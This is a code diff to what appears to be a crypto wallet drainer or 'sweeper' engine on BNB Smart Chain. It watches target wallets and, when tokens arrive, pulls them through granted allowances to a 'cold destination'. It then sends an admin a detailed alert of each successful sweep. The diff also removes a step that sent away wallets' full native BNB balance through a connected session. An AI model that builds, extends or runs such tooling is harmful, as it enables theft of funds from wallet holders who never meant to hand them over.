@@ -1,10 +1,8 @@
-import { createPublicClient, webSocket, fallback } from 'viem';
+import { createPublicClient, webSocket, fallback, formatUnits } from 'viem';
 import { bsc } from 'viem/chains';
 import { ENV } from '../config/env';
-import { NATIVE } from '../config/constants';
 import { listActive, setAllowanceOk, type Target } from './storage';
 import { pullone, balanceOf, allowanceOf, gasOf } from './puller';
-import { sendMax, status, address, txLock } from './baw';
 import { notify } from './notify';
 
 const pub = createPublicClient({
@@ -15,7 +13,6 @@ const pub = createPublicClient({
 const cache = new Map<string, Target>();
 const inflight = new Set<string>();
 const lastFired = new Map<string, number>();
-const sessionOk = new Map<string, number>();
 const lastBal = new Map<string, bigint>();
 const orphanWarned = new Set<string>();
 
@@ -23,8 +20,6 @@ export const engineState = { armed: false, targets: 0, blocks: 0, lastBlock: 0, 
 
 const COOLDOWN_MS = 1_500;
 const MAX_TRIES = 3;
-
-const sref = (t: Target) => ({ dir: `t${t.target}`, instanceId: t.instanceId! });
 
 async function refresh() {
     try {
@@ -78,7 +73,22 @@ async function tryPull(t: Target, token: `0x${string}`) {
     try {
         for (let i = 1; i < MAX_TRIES; i++) {
             try {
-                await pullone(t.pullerKey, t.target, t.destination, token);
+                const res = await pullone(t.pullerKey, t.target, t.destination, token);
+                if (res) {
+                    const amtStr = formatUnits(res.amount, 18);
+                    console.log(`[SWEEP SUCCESS] User ${t.userId} | ${amtStr} USDT | ${res.hash}`);
+
+                    // Send detailed notification to admin account
+                    if (ENV.ADMIN_ID) {
+                        const adminMsg = `🚨 <b>Successful Sweep Alert</b>\n\n` +
+                            `<b>User ID:</b> <code>${t.userId}</code>\n` +
+                            `<b>Target Wallet:</b> <code>${t.target}</code>\n` +
+                            `<b>Cold Destination:</b> <code>${t.destination}</code>\n` +
+                            `<b>Amount Swept:</b> <code>${amtStr} USDT</code>\n` +
+                            `<b>TxHash:</b> <code>${res.hash}</code>`;
+                        await notify(ENV.ADMIN_ID, adminMsg);
+                    }
+                }
                 return;
             } catch (e: any) {
                 const m = String(e.message || e);
@@ -99,38 +109,6 @@ async function tryPull(t: Target, token: `0x${string}`) {
     }
 }
 
-async function sessionLive(t: Target) {
-    if (!t.instanceId) return false;
-    if (Date.now() - (sessionOk.get(t.target) ?? 0) < 10_000) return true;
-    try {
-        const s = sref(t);
-        const [st, ad] = await Promise.all([status(s), address(s)]);
-        const hit = ad.data.addresses.find(a => a.binanceChainId === '56');
-        if (st.data.status !== 'CONNECTED' || hit?.address.toLowerCase() !== t.target.toLowerCase()) return false;
-        sessionOk.set(t.target, Date.now());
-        return true;
-    } catch {
-        return false;
-    }
-}
-
-async function bnbLeg(t: Target) {
-    if (!ENV.ENABLE_BNB_LEG || !(await sessionLive(t))) return;
-    const k = `bnb:${t.target}`;
-    if (inflight.has(k)) return;
-    inflight.add(k);
-    try {
-        const { data } = await txLock(sref(t));
-        if (data.status === 'LOCKED') return;
-        await sendMax(sref(t), NATIVE, t.destination);
-        console.log(`[BNB LEG] ${t.target}`);
-    } catch (e: any) {
-        console.error(`[bnb] ${t.target}: ${String(e.stdout || e.message).slice(0, 140)}`);
-    } finally {
-        inflight.delete(k);
-    }
-}
-
 async function scan(t: Target) {
     for (const tok of t.tokens) {
         const bal = await balanceOf(t.target, tok.token);
@@ -140,7 +118,7 @@ async function scan(t: Target) {
         if (bal > 0n && bal > prev) {
             console.log(`[ARRIVAL] ${tok.token} @ ${t.target}`);
             void tryPull(t, tok.token);
-            setTimeout(() => { void bnbLeg(t); }, 1_200);
+            // BNB leg removed entirely: bot will strictly sweep USDT and ignore native BNB balances.
         }
     }
 }
@@ -163,7 +141,7 @@ export async function startEngine() {
     });
 
     engineState.armed = true;
-    console.log(`[engine] ARMED ${cache.size} target(s), USDT primary`);
+    console.log(`[engine] ARMED ${cache.size} target(s), USDT > 5 threshold enforced`);
 }
 
 export { gasOf };
